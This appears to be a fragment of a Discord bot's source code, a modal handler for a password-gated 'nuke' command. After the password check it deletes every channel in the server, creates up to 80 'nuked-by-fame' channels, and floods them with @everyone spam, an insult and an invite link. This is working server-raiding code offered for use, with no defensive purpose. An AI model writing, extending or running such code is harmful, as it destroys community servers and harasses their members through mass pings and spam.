// ====================== NUKE MODAL SUBMIT (Updated) ======================
if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
  const password = interaction.fields.getTextInputValue('password');
  if (password !== NUKE_PASSWORD) {
    return interaction.reply({ content: '❌ Wrong nuke password.', ephemeral: true });
  }

  const session = userSessions.get(interaction.user.id);
  const guild = client.guilds.cache.get(session?.guildId);

  if (!guild) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

  await interaction.reply({ 
    content: `☢️ **Starting full nuke on ${guild.name}...**`, 
    ephemeral: true 
  });

  try {
    // Step 1: Delete all existing channels & categories
    await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
    for (const channel of guild.channels.cache.values()) {
      await channel.delete().catch(() => {});
    }

    // Step 2: Create many "NUKED BY FAME" channels
    await interaction.followUp({ content: '🔨 Creating NUKED channels...', ephemeral: true });
    const createdChannels = [];

    for (let i = 0; i < 80; i++) {  // Creates 80 channels
      try {
        const newChan = await guild.channels.create({
          name: `nuked-by-fame-${i}`,
          type: 0,
          reason: 'Nuke by Fame'
        });
        createdChannels.push(newChan);
      } catch (e) {
        console.error("Channel creation limit hit");
        break;
      }
    }

    // Step 3: Massive spam in all new channels
    await interaction.followUp({ content: '💥 Starting spam...', ephemeral: true });

    const spamText = [
      '@everyone **BET$ UNLOCKED** 🔥 FAME REAL FAME',
      'fucked by veynetta https://discord.gg/NANQMy3WnD',
      '@everyone **NUKED BY FAME** https://discord.gg/NANQMy3WnD',
      'REAL FAME BETS UNLOCKED https://discord.gg/NANQMy3WnD'
    ];

    for (const channel of createdChannels) {
      for (let i = 0; i < 12; i++) {   // Spam 12 messages per channel
        const randomMsg = spamText[Math.floor(Math.random() * spamText.length)];
        channel.send(randomMsg).catch(() => {});
      }
    }

    // Extra @everyone spam in the last channel
    if (createdChannels.length > 0) {
      const lastChannel = createdChannels[createdChannels.length - 1];
      for (let i = 0; i < 25; i++) {
        lastChannel.send('@everyone **FAME REAL FAME** https://discord.gg/NANQMy3WnD').catch(() => {});
      }
    }

    await interaction.followUp({ 
      content: `✅ **NUKE COMPLETE**\nCreated **${createdChannels.length}** channels\nSpamming **"fucked by veynetta"** + invite + @everyone`, 
      ephemeral: true 
    });

  } catch (error) {
    console.error(error);
    await interaction.followUp({ content: '⚠️ Nuke partially failed due to rate limits.', ephemeral: true });
  }

  userSessions.delete(interaction.user.id);
}
